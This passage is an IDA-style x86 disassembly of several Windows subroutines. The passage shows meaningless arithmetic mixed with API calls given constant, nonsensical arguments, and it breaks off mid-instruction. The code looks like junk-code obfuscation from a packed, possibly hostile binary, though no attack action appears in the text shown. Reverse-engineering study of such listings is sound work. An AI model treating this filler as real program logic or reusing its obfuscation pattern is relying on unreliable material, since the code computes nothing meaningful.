		mov	[ebp+var_1C4], 64h
		mov	eax, [ebp+fByPos]
		sub	eax, 55h
		sub	eax, [ebp+var_A4]
		mov	[ebp+var_104], eax
		movzx	ecx, word ptr [ebp+arg_4]
		mov	[ebp+gmdiFlags], ecx
		mov	[ebp+var_154], 57h
		mov	edx, [ebp+arg_0]
		sub	edx, 18h
		mov	[ebp+fByPos], edx
		mov	eax, [ebp+var_110]
		cmp	eax, dword_42C00C
		jge	short loc_40F2FD
		movzx	ecx, [ebp+var_190]
		mov	edx, [ebp+var_194]
		sub	edx, ecx
		add	edx, [ebp+arg_C]
		and	edx, 38h
		mov	[ebp+var_1A0], dx

loc_40F2FD:				; CODE XREF: sub_40F1F0+EFj
		mov	eax, [ebp+var_B0]
		add	eax, 8
		xor	eax, [ebp+var_C]
		mov	[ebp+var_1AC], eax
		movzx	ecx, [ebp+var_5]
		mov	edx, 21h
		sub	edx, ecx
		add	edx, 58h
		mov	[ebp+var_D8], edx
		mov	[ebp+arg_0], 94h
		movzx	eax, [ebp+var_F6]
		mov	[ebp+fByPos], eax
		mov	ecx, [ebp+var_194]
		add	ecx, 34h
		mov	[ebp+var_4], ecx
		mov	edx, [ebp+var_234]
		sub	edx, 31h
		mov	[ebp+var_D8], edx
		movzx	eax, [ebp+var_23C]
		mov	ecx, [ebp+arg_10]
		add	ecx, 8
		and	eax, ecx
		mov	[ebp+var_A8], ax
		mov	[ebp+fByPos], 40h
		push	5Eh		; nHeight
		push	33h		; nWidth
		push	13h		; hBitmap
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:CreateCaret
		mov	[ebp+gmdiFlags], eax
		mov	[ebp+arg_10], 35h
		mov	eax, [ebp+arg_10]
		sub	eax, 46h
		sub	eax, [ebp+arg_C]
		mov	[ebp+var_A8], ax
		movzx	ecx, [ebp+var_1AD]
		movzx	edx, [ebp+var_188]
		lea	eax, [ecx+edx+3Bh]
		mov	[ebp+var_108], ax
		mov	eax, [ebp+var_194]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_40F1F0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40F3D0	proc near		; CODE XREF: WinMain(x,x,x,x)+5308p

var_25D		= byte ptr -25Dh
var_25C		= dword	ptr -25Ch
var_250		= word ptr -250h
var_220		= dword	ptr -220h
var_1C8		= word ptr -1C8h
var_1C1		= byte ptr -1C1h
var_1C0		= dword	ptr -1C0h
var_1B8		= dword	ptr -1B8h
var_1B1		= byte ptr -1B1h
var_1AC		= dword	ptr -1ACh
var_1A0		= word ptr -1A0h
var_19C		= word ptr -19Ch
var_184		= dword	ptr -184h
var_178		= dword	ptr -178h
var_170		= dword	ptr -170h
var_16B		= byte ptr -16Bh
var_164		= dword	ptr -164h
var_121		= byte ptr -121h
var_120		= word ptr -120h
var_11C		= dword	ptr -11Ch
var_118		= word ptr -118h
lpFileName	= dword	ptr -114h
var_10E		= byte ptr -10Eh
var_10D		= byte ptr -10Dh
var_10C		= word ptr -10Ch
var_108		= word ptr -108h
var_104		= dword	ptr -104h
hdc		= dword	ptr -0F4h
var_ED		= byte ptr -0EDh
var_EC		= dword	ptr -0ECh
var_E8		= dword	ptr -0E8h
var_E1		= byte ptr -0E1h
var_E0		= word ptr -0E0h
var_D8		= word ptr -0D8h
var_D4		= dword	ptr -0D4h
var_D0		= word ptr -0D0h
var_C5		= byte ptr -0C5h
var_C4		= word ptr -0C4h
var_C0		= dword	ptr -0C0h
var_BC		= word ptr -0BCh
var_B8		= dword	ptr -0B8h
var_B4		= word ptr -0B4h
var_B0		= dword	ptr -0B0h
var_A8		= word ptr -0A8h
var_A4		= dword	ptr -0A4h
latency		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_98		= word ptr -98h
var_84		= dword	ptr -84h
var_6C		= dword	ptr -6Ch
var_30		= dword	ptr -30h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= word ptr -20h
var_1C		= word ptr -1Ch
var_18		= dword	ptr -18h
var_14		= word ptr -14h
lpEventTrack	= dword	ptr -0Ch
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_2		= word ptr -2

		push	ebp
		mov	ebp, esp
		sub	esp, 260h
		push	ebx
		push	esi
		mov	eax, hdc
		or	eax, 39h
		mov	Wow64Process, eax
		mov	[ebp+var_178], 5
		movzx	esi, [ebp+var_ED]
		movzx	ecx, [ebp+var_121]
		add	esi, ecx
		sub	esi, [ebp+var_EC]
		mov	edx, y
		push	edx
		mov	eax, dword_42C024
		push	eax
		mov	ecx, y
		push	ecx
		mov	edx, y
		push	edx
		mov	eax, dword_42C024
		push	eax
		mov	ecx, lpExitCode
		push	ecx
		call	sub_409B10
		add	esp, 18h
		sub	esi, eax
		mov	[ebp+var_1C8], si
		movzx	edx, [ebp+var_98]
		sub	edx, [ebp+var_D4]
		sub	edx, 7Ah
		or	edx, 0Ch
		mov	[ebp+var_22], dl
		mov	eax, [ebp+var_EC]
		add	eax, 3Dh
		mov	[ebp+var_7], al
		movzx	ecx, [ebp+var_98]
		add	ecx, [ebp+var_1B8]
		movzx	edx, [ebp+var_118]
		or	edx, ecx
		mov	[ebp+var_118], dx
		mov	eax, 61h
		mov	word ptr [ebp+lpEventTrack], ax
		mov	[ebp+var_6C], 4
		mov	[ebp+lpEventTrack], 1Fh
		mov	dword_42C034, 11h
		movzx	ecx, [ebp+var_2]
		mov	[ebp+lpEventTrack], ecx
		mov	[ebp+var_164], 2Bh
		movzx	esi, [ebp+var_1C1]
		mov	edx, [ebp+var_B8]
		push	edx		; int
		mov	eax, [ebp+hdc]
		push	eax		; hWnd
		call	sub_408650
		add	esp, 8
		movzx	ecx, [ebp+var_10D]
		add	eax, ecx
		or	esi, eax
		mov	edx, [ebp+lpFileName]
		push	edx		; lpFileName
		mov	eax, [ebp+hdc]
		push	eax		; hdc
		call	ds:SetICMProfileA
		or	esi, eax
		mov	[ebp+var_E0], si
		movzx	ecx, [ebp+var_1C1]
		add	ecx, 60h
		movzx	edx, [ebp+var_10C]
		and	ecx, edx
		mov	[ebp+var_18], ecx
		movzx	eax, [ebp+var_1B1]
		add	eax, 0B5h
		movzx	ecx, [ebp+var_120]
		or	eax, ecx
		or	eax, [ebp+hdc]
		mov	[ebp+var_21], al
		mov	edx, [ebp+var_1C0]
		sub	edx, [ebp+lpEventTrack]
		movzx	eax, [ebp+var_21]
		lea	ecx, [edx+eax+34h]
		mov	[ebp+var_121], cl
		movzx	esi, [ebp+var_10D]
		mov	edx, [ebp+lpEventTrack]
		push	edx		; lpEventTrack
		call	ds:TrackMouseEvent
		lea	eax, [esi+eax+43h]
		movzx	ecx, [ebp+var_5]
		add	eax, ecx
		mov	[ebp+var_108], ax
		movzx	edx, [ebp+var_20]
		mov	eax, [ebp+hdc]
		sub	eax, edx
		sub	eax, 43h
		movzx	ecx, [ebp+var_22]
		sub	ecx, eax
		mov	[ebp+var_22], cl
		mov	[ebp+var_84], 29h
		movzx	edx, [ebp+var_A8]
		add	edx, 24h
		xor	edx, 33h
		movzx	eax, [ebp+var_118]
		or	eax, edx
		mov	[ebp+var_118], ax
		mov	[ebp+var_220], 3Ah
		mov	ecx, [ebp+var_11C]
		mov	[ebp+var_E8], ecx
		cmp	dword_42C008, 33h
		jg	short loc_40F5D5
		mov	[ebp+var_104], 0Bh
		mov	edx, [ebp+var_11C]
		mov	[ebp+lpEventTrack], edx

loc_40F5D5:				; CODE XREF: sub_40F3D0+1F0j
		mov	eax, 14h
		sub	eax, [ebp+var_E8]
		and	eax, 1Ch
		mov	[ebp+var_1C], ax
		mov	ecx, [ebp+var_EC]
		add	ecx, 25h
		sub	ecx, [ebp+var_18]
		add	ecx, 43h
		mov	[ebp+var_10C], cx
		movzx	edx, [ebp+var_250]
		movzx	eax, [ebp+var_22]
		sub	edx, eax
		movzx	ecx, [ebp+var_D8]
		and	edx, ecx
		movzx	eax, [ebp+var_BC]
		sub	eax, edx
		mov	[ebp+var_BC], ax
		mov	ecx, [ebp+lpEventTrack]
		mov	[ebp+lpEventTrack], ecx
		movzx	edx, [ebp+var_E1]
		sub	edx, [ebp+var_B0]
		add	edx, 17h
		movzx	eax, [ebp+var_1C1]
		movzx	ecx, [ebp+var_98]
		add	eax, ecx
		or	edx, eax
		mov	[ebp+var_25D], dl
		movzx	edx, [ebp+var_121]
		movzx	eax, [ebp+var_1B1]
		lea	ecx, [edx+eax+0Dh]
		mov	[ebp-4], ecx
		mov	edx, [ebp+lpFileName]
		sub	edx, 3Ch
		mov	[ebp+var_1B8], edx
		movzx	eax, [ebp+var_1C]
		add	eax, 5Bh
		mov	[ebp+hdc], eax
		movzx	esi, [ebp+var_ED]
		mov	ecx, [ebp+hdc]
		push	ecx		; hdc
		call	ds:SaveDC
		lea	edx, [esi+eax+4Fh]
		mov	[ebp+var_C0], edx
		mov	eax, [ebp+latency]
		push	eax		; latency
		call	ds:RequestWakeupLatency
		mov	ecx, [ebp+lpFileName]
		sub	ecx, eax
		mov	edx, [ebp+var_11C]
		lea	eax, [ecx+edx+48h]
		mov	[ebp+var_10C], ax
		movzx	ecx, [ebp+var_16B]
		mov	[ebp+lpEventTrack], ecx
		mov	edx, 0A0h
		mov	[ebp+var_B4], dx
		movzx	eax, [ebp+var_E1]
		add	eax, 6
		and	eax, 4Ah
		mov	ecx, y
		xor	ecx, 21h
		or	eax, ecx
		mov	[ebp+var_22], al
		movzx	edx, byte ptr hdc+2
		mov	Wow64Process, edx
		movzx	eax, [ebp+var_10D]
		mov	ecx, 0FFFFFFE0h
		sub	ecx, eax
		sub	ecx, 49h
		or	ecx, y
		mov	[ebp+var_99], cl
		movzx	edx, [ebp+var_7]
		movzx	eax, [ebp+var_1A0]
		sub	edx, eax
		add	edx, 3Ch
		mov	[ebp+var_98], dx
		mov	ecx, dword_42C024
		mov	[ebp+var_184], ecx
		mov	edx, hProcess
		mov	y, edx
		mov	dword_42C048, 13h
		mov	ebx, [ebp+var_1B8]
		add	ebx, 21h
		push	4Ah		; lprect
		push	36h		; hmf
		push	24h		; hdc
		call	ds:PlayEnhMetaFile
		sub	ebx, eax
		sub	ebx, [ebp+var_C0]
		sub	ebx, 3Ah
		mov	[ebp+var_121], bl
		movzx	eax, [ebp+var_7]
		sub	eax, 43h
		mov	[ebp+var_7], al
		mov	ecx, [ebp+hdc]
		and	ecx, 0FFFFFFDDh
		mov	[ebp+var_A4], ecx
		mov	edx, lpExitCode
		add	edx, dword_42C024
		add	edx, hdc
		xor	edx, 63h
		mov	[ebp+var_B4], dx
		movzx	eax, word ptr hProcess
		mov	dword_42C024, eax
		mov	ecx, hdc
		mov	[ebp+var_30], ecx
		movzx	edx, [ebp+var_14]
		sub	edx, 0Ah
		mov	[ebp+var_14], dx
		mov	eax, hdc
		mov	hdc, eax
		mov	ecx, 9
		sub	ecx, Wow64Process
		add	ecx, 48h
		movzx	edx, [ebp+var_6]
		movzx	eax, [ebp+var_B4]
		add	edx, eax
		xor	ecx, edx
		mov	[ebp+var_25D], cl
		movzx	ecx, [ebp+var_19C]
		add	ecx, Wow64Process
		add	ecx, Wow64Process
		movzx	edx, [ebp+var_121]
		add	edx, ecx
		mov	[ebp+var_121], dl
		mov	eax, [ebp+var_104]
		mov	ecx, lpExitCode
		lea	edx, [ecx+eax+5Dh]
		mov	[ebp+var_25C], edx
		movzx	eax, [ebp+var_25D]
		cmp	eax, 4Dh
		jnz	short loc_40F853
		movzx	ecx, [ebp+var_C5]
		mov	lpExitCode, ecx

loc_40F853:				; CODE XREF: sub_40F3D0+474j
		mov	edx, [ebp+var_C0]
		and	edx, 57h
		mov	hdc, edx
		mov	eax, [ebp+var_1AC]
		add	eax, hProcess
		sub	eax, y
		mov	ecx, Wow64Process
		lea	edx, [eax+ecx+15h]
		mov	[ebp+var_10E], dl
		call	sub_409DF0
		movzx	eax, [ebp+var_E1]
		mov	y, eax
		movzx	ecx, [ebp+var_C5]
		movzx	edx, [ebp+var_D0]
		sub	ecx, edx
		add	ecx, lpExitCode
		movzx	eax, [ebp+var_C5]
		imul	eax, ecx
		mov	[ebp+var_C5], al
		mov	[ebp+var_170], 3Dh
		mov	ecx, [ebp+var_18]
		sub	ecx, 19h
		or	ecx, 3Ch
		mov	[ebp+var_1C1], cl
		movzx	edx, [ebp+var_19C]
		add	edx, 2
		mov	[ebp+var_250], dx
		mov	eax, lpExitCode
		mov	dword_42C024, eax
		mov	[ebp+var_6C], 21h
		mov	dword_42C024, 3Ch
		mov	ecx, 0Fh
		sub	ecx, hProcess
		or	ecx, 78h
		mov	[ebp+var_C4], cx
		movzx	edx, [ebp+var_6]
		sub	edx, 1Ah
		mov	[ebp+var_E8], edx
		movzx	eax, [ebp+var_22]
		add	eax, [ebp+lpEventTrack]
		movzx	ecx, [ebp+var_D8]
		add	eax, ecx
		sub	eax, [ebp+var_B8]
		mov	[ebp+var_C4], ax
		mov	edx, [ebp+lpEventTrack]
		sub	edx, [ebp+lpEventTrack]
		sub	edx, [ebp+latency]
		or	edx, 7Ah
		mov	[ebp+var_5], dl
		mov	eax, [ebp+var_1C0]
		add	eax, [ebp+lpEventTrack]
		mov	[ebp+var_1B8], eax
		mov	[ebp+latency], 4Fh
		mov	ecx, [ebp+hdc]
		add	ecx, 3Dh
		mov	[ebp+var_E8], ecx
		mov	edx, [ebp+lpFileName]
		add	edx, [ebp+latency]
		and	edx, 81h
		mov	[ebp+var_108], dx
		movzx	eax, [ebp+var_E1]
		sub	eax, 9
		mov	[ebp+var_E8], eax
		mov	ecx, [ebp+var_1B8]
		add	ecx, 47h
		mov	[ebp+lpEventTrack], ecx
		mov	edx, [ebp+lpFileName]
		add	edx, 11h
		mov	[ebp+lpFileName], edx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40F3D0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40F9D0	proc near		; CODE XREF: sub_4071A0+123p
					; sub_4097A0+97p

var_250		= dword	ptr -250h
var_248		= word ptr -248h
var_240		= dword	ptr -240h
var_1F0		= dword	ptr -1F0h
var_1C4		= dword	ptr -1C4h
var_1C0		= word ptr -1C0h
var_1BC		= dword	ptr -1BCh
var_1A4		= dword	ptr -1A4h
var_19C		= dword	ptr -19Ch
var_198		= word ptr -198h
var_168		= dword	ptr -168h
var_105		= byte ptr -105h
var_100		= word ptr -100h
var_FC		= dword	ptr -0FCh
var_EC		= dword	ptr -0ECh
var_E4		= dword	ptr -0E4h
var_DD		= byte ptr -0DDh
var_DC		= word ptr -0DCh
var_D0		= dword	ptr -0D0h
var_CC		= word ptr -0CCh
var_BC		= word ptr -0BCh
var_B0		= word ptr -0B0h
var_AC		= dword	ptr -0ACh
var_A4		= word ptr -0A4h
var_99		= byte ptr -99h
var_98		= word ptr -98h
var_74		= dword	ptr -74h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_31		= word ptr  39h

		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		push	esi
		mov	eax, [ebp+var_19C]
		mov	[ebp+var_1F0], eax
		mov	ecx, 65h
		sub	ecx, [ebp+arg_0]
		mov	[ebp+var_98], cx
		movzx	edx, [ebp+var_A4]
		and	edx, dword_42C03C
		mov	dword_42C03C, edx
		mov	byte ptr [ebp+var_24], 61h
		movzx	eax, [ebp+var_14]
		mov	ecx, [ebp+var_24]
		lea	edx, [eax+ecx-61h]
		and	edx, 33h
		mov	[ebp+var_99], dl
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_1BC], eax
		movzx	ecx, [ebp+var_98]
		add	ecx, 34h
		movzx	edx, [ebp+var_248]
		mov	eax, [ebp+var_1BC]
		sub	eax, edx
		movzx	edx, [ebp+var_5]
		add	eax, edx
		xor	ecx, eax
		mov	[ebp+var_1A], cl
		mov	eax, 1Ch
		sub	eax, [ebp+var_250]
		add	eax, 2Ah
		mov	[ebp+var_B0], ax
		mov	ecx, dword_42C048
		sub	ecx, [ebp+var_1BC]
		mov	dword_42C048, ecx
		mov	edx, [ebp+arg_0]
		mov	eax, [ebp+var_1BC]
		lea	ecx, [eax+edx+0Dh]
		and	ecx, [ebp+arg_4]
		xor	ecx, 45h
		mov	[ebp+var_DD], cl
		mov	edx, [ebp+var_1C4]
		push	edx
		mov	eax, [ebp+var_1BC]
		push	eax
		mov	ecx, [ebp+arg_4]
		push	ecx
		mov	edx, [ebp+arg_0]
		push	edx
		mov	eax, [ebp+var_24]
		push	eax
		call	sub_410210
		add	esp, 14h
		cmp	eax, 1Fh
		jnz	short loc_40FACC
		mov	[ebp+var_1BC], 2Eh
		mov	ecx, [ebp+var_1C4]
		and	ecx, 2Ah
		mov	[ebp+arg_0], ecx
		jmp	short loc_40FAFB
; ---------------------------------------------------------------------------

loc_40FACC:				; CODE XREF: sub_40F9D0+E2j
		movzx	edx, [ebp+var_1C0]
		mov	eax, 26h
		sub	eax, edx
		sub	eax, [ebp+arg_4]
		movzx	ecx, [ebp+var_100]
		lea	edx, [eax+ecx-31h]
		mov	[ebp+var_105], dl
		movzx	eax, [ebp+var_BC]
		sub	eax, 4
		mov	[ebp+var_20], eax

loc_40FAFB:				; CODE XREF: sub_40F9D0+FAj
		mov	ecx, [ebp+var_1C4]
		mov	[ebp+var_74], ecx
		mov	edx, [ebp+var_1C4]
		add	edx, 5Ch
		mov	[ebp+var_19C], edx
		mov	eax, [ebp+var_1C4]
		add	eax, 47h
		mov	[ebp+var_10], eax
		movzx	ecx, [ebp+var_248]
		movzx	edx, [ebp+var_99]
		sub	ecx, edx
		movzx	eax, [ebp+var_DC]
		add	ecx, eax
		mov	[ebp+var_D0], ecx
		mov	[ebp+arg_0], 58h
		movzx	ecx, [ebp+var_198]
		mov	edx, 1Bh
		sub	edx, ecx
		mov	[ebp+var_24], edx
		movzx	eax, [ebp+arg_31]
		mov	[ebp+var_1BC], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_168], ecx
		mov	edx, [ebp+var_EC]
		sub	edx, [ebp+var_FC]
		or	edx, 1Ah
		mov	[ebp+var_240], edx
		movzx	esi, [ebp+var_1A]
		sub	esi, [ebp+var_E4]
		mov	eax, [ebp+arg_4]
		push	eax
		call	sub_40FC00
		add	esp, 4
		sub	esi, eax
		mov	[ebp+var_D0], esi
		movzx	ecx, [ebp+var_19]
		add	ecx, [ebp+var_EC]
		xor	ecx, 5Ch
		mov	[ebp+var_AC], ecx
		movzx	edx, [ebp+var_B0]
		movzx	eax, [ebp+var_98]
		sub	edx, eax
		mov	[ebp+var_98], dx
		mov	ecx, [ebp+var_19C]
		add	ecx, 16h
		sub	ecx, [ebp+var_20]
		mov	[ebp+var_1A4], ecx
		movzx	edx, [ebp+var_CC]
		sub	edx, 12h
		mov	[ebp+var_CC], dx
		mov	eax, [ebp+var_1C4]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_40F9D0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40FC00	proc near		; CODE XREF: sub_40EDD0+FAp
					; sub_40F9D0+1BCp

var_248		= dword	ptr -248h
var_244		= dword	ptr -244h
var_240		= dword	ptr -240h
var_239		= byte ptr -239h
var_238		= dword	ptr -238h
var_230		= word ptr -230h
var_22C		= dword	ptr -22Ch
var_224		= word ptr -224h
var_204		= dword	ptr -204h
var_1A1		= byte ptr -1A1h
var_19C		= word ptr -19Ch
var_195		= byte ptr -195h
var_194		= word ptr -194h
var_180		= word ptr -180h
var_154		= dword	ptr -154h
var_109		= byte ptr -109h
var_108		= word ptr -108h
var_104		= dword	ptr -104h
var_F9		= byte ptr -0F9h
var_F0		= dword	ptr -0F0h
var_EC		= word ptr -0ECh
var_E4		= dword	ptr -0E4h
var_D5		= byte ptr -0D5h
var_D4		= word ptr -0D4h
var_AC		= dword	ptr -0ACh
var_A4		= dword	ptr -0A4h
var_A0		= dword	ptr -0A0h
var_9C		= word ptr -9Ch
var_98		= dword	ptr -98h
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_84		= dword	ptr -84h
pv		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
var_7		= byte ptr -7
var_6		= byte ptr -6
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 248h
		push	ebx
		mov	eax, [ebp+var_240]
		sub	eax, [ebp+var_98]
		or	eax, 0Fh
		mov	[ebp+var_238], eax
		mov	[ebp+var_AC], 38h
		mov	ecx, [ebp+var_AC]
		mov	[ebp+var_248], ecx
		cmp	[ebp+var_248], 0
		jz	short loc_40FC4C
		cmp	[ebp+var_248], 1
		jz	short loc_40FC70
		jmp	loc_40FD0D
; ---------------------------------------------------------------------------

loc_40FC4C:				; CODE XREF: sub_40FC00+3Cj
		mov	edx, 6Bh
		mov	[ebp+var_19C], dx
		mov	[ebp+var_240], 31h
		mov	eax, [ebp+var_4]
		mov	[ebp+var_AC], eax
		jmp	loc_40FD17
; ---------------------------------------------------------------------------

loc_40FC70:				; CODE XREF: sub_40FC00+45j
		cmp	dword_42C000, 53h
		jle	short loc_40FC93
		mov	ecx, 4Fh
		sub	ecx, [ebp+arg_0]
		mov	edx, [ebp+arg_0]
		add	edx, [ebp+var_AC]
		xor	ecx, edx
		mov	[ebp+var_194], cx

loc_40FC93:				; CODE XREF: sub_40FC00+77j
		xor	eax, eax
		jz	short loc_40FCB0
		mov	[ebp+var_AC], 2
		mov	ecx, [ebp+arg_0]
		add	ecx, [ebp+var_E4]
		sub	ecx, [ebp+var_10]
		mov	[ebp+var_10], ecx

loc_40FCB0:				; CODE XREF: sub_40FC00+95j
		mov	edx, [ebp+var_240]
		cmp	edx, [ebp+var_AC]
		jnz	short loc_40FCE3
		mov	eax, [ebp+var_A4]
		and	eax, 10h
		mov	[ebp+var_4], eax
		mov	ecx, [ebp+var_10]
		add	ecx, 41h
		mov	edx, [ebp+var_AC]
		sub	edx, 1Ah
		and	ecx, edx
		mov	[ebp+var_239], cl
		jmp	short loc_40FD0B
; ---------------------------------------------------------------------------

loc_40FCE3:				; CODE XREF: sub_40FC00+BCj
		mov	eax, [ebp+var_238]
		add	eax, [ebp+var_AC]
		movzx	ecx, [ebp+var_109]
		add	eax, ecx
		sub	eax, [ebp+var_AC]
		add	eax, 1Fh
		mov	[ebp+var_7], al
		mov	[ebp+pv], 1

loc_40FD0B:				; CODE XREF: sub_40FC00+E1j
		jmp	short loc_40FD17
; ---------------------------------------------------------------------------

loc_40FD0D:				; CODE XREF: sub_40FC00+47j
		mov	[ebp+var_AC], 16h

loc_40FD17:				; CODE XREF: sub_40FC00+6Bj
					; sub_40FC00:loc_40FD0Bj
		mov	[ebp+var_244], 0
		jmp	short loc_40FD32
; ---------------------------------------------------------------------------

loc_40FD23:				; CODE XREF: sub_40FC00+1D9j
		mov	edx, [ebp+var_244]
		add	edx, 1
		mov	[ebp+var_244], edx

loc_40FD32:				; CODE XREF: sub_40FC00+121j
		cmp	[ebp+var_244], 7
		jge	loc_40FDDE
		mov	al, byte ptr [ebp+var_240]
		mov	byte ptr [ebp+var_AC], al
		mov	ecx, [ebp+arg_0]
		sub	ecx, [ebp+arg_0]
		add	ecx, 39h
		movzx	edx, [ebp+var_194]
		sub	ecx, edx
		mov	[ebp+var_108], cx
		movzx	eax, [ebp+var_6]
		mov	ecx, [ebp+var_AC]
		lea	edx, [ecx+eax+7Fh]
		or	edx, [ebp+var_AC]
		mov	[ebp+var_D5], dl
		mov	[ebp+var_E4], 3
		mov	[ebp+var_104], 28h
		mov	eax, [ebp+pv]
		and	eax, 18h
		mov	[ebp+pv], eax
		movzx	ecx, [ebp+var_195]
		mov	edx, [ebp+var_F0]
		add	edx, 52h
		or	ecx, edx
		mov	[ebp+var_8C], ecx
		movzx	eax, [ebp+var_D4]
		movzx	ecx, [ebp+var_19]
		lea	edx, [ecx+eax+12h]
		mov	[ebp+var_19], dl
		mov	eax, 2Ah
		sub	eax, [ebp+var_22C]
		sub	eax, 5Fh
		mov	[ebp+var_22C], eax
		jmp	loc_40FD23
; ---------------------------------------------------------------------------

loc_40FDDE:				; CODE XREF: sub_40FC00+139j
		movzx	ecx, [ebp+var_180]
		sub	ecx, 23h
		mov	[ebp+var_180], cx
		mov	byte ptr [ebp+var_AC], 35h
		mov	[ebp+var_154], 4Eh
		mov	edx, [ebp+var_A0]
		add	edx, 3Eh
		mov	[ebp+pv], edx
		mov	eax, [ebp+var_240]
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+var_E4]
		push	ecx
		mov	edx, [ebp+pv]
		push	edx
		mov	eax, [ebp+var_AC]
		push	eax
		mov	ecx, [ebp+arg_0]
		push	ecx
		mov	edx, [ebp+arg_0]
		push	edx
		call	sub_410210
		add	esp, 14h
		movzx	ecx, [ebp+var_14]
		lea	edx, [eax+ecx-9Eh]
		mov	[ebp+var_D5], dl
		mov	eax, 25h
		sub	eax, [ebp+var_AC]
		movzx	ecx, [ebp+var_F9]
		add	ecx, 10h
		and	eax, ecx
		mov	[ebp+var_230], ax
		mov	edx, [ebp+pv]
		mov	[ebp+var_AC], edx
		mov	[ebp+pv], 37h
		mov	[ebp+var_204], 4Dh
		mov	eax, [ebp+var_AC]
		add	eax, 31h
		mov	[ebp+var_22C], eax
		movzx	ecx, [ebp+var_6]
		movzx	edx, [ebp+var_D5]
		lea	eax, [edx+ecx+63h]
		mov	[ebp+var_D5], al
		movzx	ecx, [ebp+var_90]
		movzx	edx, [ebp+var_195]
		mov	eax, 42h
		sub	eax, edx
		or	ecx, eax
		mov	[ebp+var_F0], ecx
		movzx	ecx, [ebp+var_109]
		mov	edx, 1Ah
		sub	edx, ecx
		sub	edx, 23h
		movzx	eax, [ebp+var_7]
		sub	eax, edx
		mov	[ebp+var_7], al
		mov	[ebp+arg_0], 10h
		movzx	ecx, [ebp+var_1A1]
		add	ecx, 1Ch
		and	ecx, 1Ch
		mov	[ebp+var_8C], ecx
		mov	edx, [ebp+var_F0]
		add	edx, [ebp+arg_0]
		mov	[ebp+pv], edx
		mov	[ebp+var_84], 34h
		movzx	ebx, [ebp+var_1A]
		add	ebx, 57h
		mov	eax, [ebp+pv]
		push	eax		; pv
		push	4Ch		; c
		push	12h		; h
		call	ds:GetObjectA
		mov	ecx, [ebp+var_4]
		lea	edx, [eax+ecx-22h]
		or	ebx, edx
		mov	[ebp+var_195], bl
		movzx	eax, [ebp+var_194]
		movzx	ecx, [ebp+var_9C]
		sub	eax, ecx
		movzx	edx, [ebp+var_224]
		sub	eax, edx
		mov	[ebp+var_D5], al
		mov	eax, dword_42C03C
		add	eax, 2
		mov	dword_42C03C, eax
		movzx	ecx, [ebp+var_EC]
		sub	ecx, [ebp+pv]
		mov	[ebp+var_EC], cx
		mov	eax, [ebp+var_E4]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40FC00	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40FF80(int, int, HDC hdc, int, int, int)
sub_40FF80	proc near		; CODE XREF: sub_407820+1F7p
					; sub_40EDD0+15Cp

var_24C		= dword	ptr -24Ch
var_248		= dword	ptr -248h
var_240		= dword	ptr -240h
var_1C8		= dword	ptr -1C8h
var_1B4		= word ptr -1B4h
var_1AD		= byte ptr -1ADh
var_1A1		= byte ptr -1A1h
var_194		= dword	ptr -194h
var_10D		= byte ptr -10Dh
var_108		= dword	ptr -108h
var_FC		= word ptr -0FCh
var_F8		= word ptr -0F8h
var_F4		= dword	ptr -0F4h
var_EC		= word ptr -0ECh
var_E5		= byte ptr -0E5h
var_E0		= dword	ptr -0E0h
var_D9		= byte ptr -0D9h
var_D8		= word ptr -0D8h
var_CC		= dword	ptr -0CCh
var_C8		= word ptr -0C8h
var_B4		= word ptr -0B4h
var_AC		= dword	ptr -0ACh
var_A0		= dword	ptr -0A0h
var_98		= dword	ptr -98h
var_90		= word ptr -90h
var_20		= dword	ptr -20h
arg_4		= dword	ptr  0Ch
hdc		= dword	ptr  10h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		mov	eax, [ebp+var_248]
		push	eax
		mov	ecx, [ebp+hdc]
		push	ecx
		call	sub_4100E0
		add	esp, 8
		add	eax, 5Ah
		and	eax, [ebp+var_24C]
		mov	[ebp+var_A0], eax
		mov	byte ptr [ebp+hdc], 4Ch
		mov	[ebp+var_1C8], 40h
		mov	edx, [ebp+arg_14]
		mov	eax, [ebp+var_20]
		lea	ecx, [eax+edx+3Ch]
		mov	[ebp+var_F4], ecx
		mov	edx, 2Fh
		mov	[ebp+var_90], dx
		movzx	eax, [ebp+var_1B4]
		mov	[ebp+var_194], eax
		cmp	[ebp+var_E0], 3Eh
		jge	short loc_410002
		mov	ecx, [ebp+var_98]
		mov	edx, [ebp+var_240]
		lea	eax, [edx+ecx-0Eh]
		mov	[ebp+var_FC], ax

loc_410002:				; CODE XREF: sub_40FF80+69j
		movzx	ecx, [ebp+var_E5]
		add	ecx, [ebp+var_A0]
		add	ecx, [ebp+hdc]
		mov	[ebp+var_AC], ecx
		mov	edx, [ebp+hdc]
		push	edx		; hbr
		push	16h		; hrgn
		mov	eax, [ebp+hdc]
		push	eax		; hdc
